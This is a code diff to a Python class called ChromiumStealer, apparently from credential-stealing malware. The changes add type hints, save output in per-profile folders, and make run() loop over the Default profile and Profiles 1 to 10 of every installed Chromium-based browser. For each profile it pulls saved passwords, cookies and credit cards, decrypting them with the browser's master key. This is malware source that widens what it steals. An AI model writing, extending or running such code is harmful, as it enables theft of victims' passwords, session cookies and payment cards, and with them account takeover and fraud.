@@ -67,7 +67,7 @@ class ChromiumStealer(ModuleManager):
             'iridium': appdata + '\\Iridium\\User Data',
         }
 
-    def get_master_key(self, path: str):
+    def get_master_key(self, path: str) -> bytes:
         if not os.path.exists(path):
             return
 
@@ -94,20 +94,29 @@ class ChromiumStealer(ModuleManager):
         return decrypted_pass
 
 
-    def save_results(self, browser_name, data_type, content):
-        if not os.path.exists(browser_name):
-            os.mkdir(browser_name)
-        if content is not None:
-            open(f'{browser_name}/{data_type}.txt', 'w').write(content)
-            print(f"\t [*] Saved in {browser_name}/{data_type}.txt")
+    def save_results(self, browser_name, data_type, content, profile) -> None:
+        save_path = os.path.join(self.browsers_folder, browser_name, profile)
+        
+        if not os.path.isdir(save_path):
+            os.makedirs(save_path)
+        
+        filename = os.path.join(save_path, f'{data_type}.txt')
+
+        if content:
+            with open(filename, 'w', encoding='utf-8') as file:
+                file.write(content)
         else:
-            print(f"\t [-] No Data Found!")
+            print("No Data Found")
+        
+        if not os.listdir(save_path):
+            os.rmdir(save_path)
 
 
-    def get_login_data(self, path: str, profile: str, master_key, browser_name: str):
+    def get_login_data(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
+        print(browser_name, profile, path)
         result = ""
         login_db = f'{path}\\{profile}\\Login Data'
-        copy_path = os.path.join(self.browsers_folder, browser_name) 
+        copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
 
         if not os.path.exists(login_db):
             return
@@ -133,10 +142,10 @@ class ChromiumStealer(ModuleManager):
         return result
 
 
-    def get_credit_cards(self, path: str, profile: str, master_key, browser_name:str):
+    def get_credit_cards(self, path: str, profile: str, master_key: bytes, browser_name:str) -> str:
         result = ""
         cards_db = f'{path}\\{profile}\\Web Data'
-        copy_path = os.path.join(self.browsers_folder, browser_name) 
+        copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
         
         if not os.path.exists(cards_db):
             return
@@ -165,10 +174,10 @@ class ChromiumStealer(ModuleManager):
         return result
 
 
-    def get_cookies(self, path: str, profile: str, master_key, browser_name:str):
+    def get_cookies(self, path: str, profile: str, master_key: bytes, browser_name:str) -> str:
         result = ""
         cookie_db = f'{path}\\{profile}\\Network\\Cookies'
-        copy_path = os.path.join(self.browsers_folder, browser_name) 
+        copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
         
         if not os.path.exists(cookie_db):
             return
@@ -205,21 +214,44 @@ class ChromiumStealer(ModuleManager):
         return results
     
     def run(self):
+        profiles = ["Default"]
+        for i in range(1, 11):
+            profiles.append("Profile {number}".format(number=i))
+        
         available_browsers = self.installed_browsers()
+
         for browser in available_browsers:
             browser_path = self.browsers[browser]
             master_key = self.get_master_key(browser_path)
-            print("\n\n\n", "="*50, "\n\n\n")
-            print(browser)
-            print(browser_path)
-            print(master_key)
-            
-            print(f"Getting Stored Details from {browser}")
 
-            self.save_results(browser, 'Saved_Passwords', self.get_login_data(browser_path, "Default", master_key, browser_name=browser))
-            self.save_results(browser, 'Browser_Cookies', self.get_cookies(browser_path, "Default", master_key, browser_name=browser))
-            self.save_results(browser, 'Saved_Credit_Cards', self.get_credit_cards(browser_path, "Default", master_key, browser_name=browser))
-
-
-    
+            for profile in profiles:
+                self.save_results(
+                    browser, 'login', 
+                    self.get_login_data(
+                        path=browser_path, 
+                        profile=profile, 
+                        master_key=master_key, 
+                        browser_name=browser
+                    ), profile
+                )
+                
+                self.save_results(
+                    browser, 'cookies', 
+                    self.get_cookies(
+                        path=browser_path, 
+                        profile=profile, 
+                        master_key=master_key, 
+                        browser_name=browser
+                    ), profile
+                )
+                
+                self.save_results(
+                    browser, 'cards', 
+                    self.get_credit_cards(
+                        path=browser_path, 
+                        profile=profile, 
+                        master_key=master_key, 
+                        browser_name=browser
+                    ), profile
+                )
         
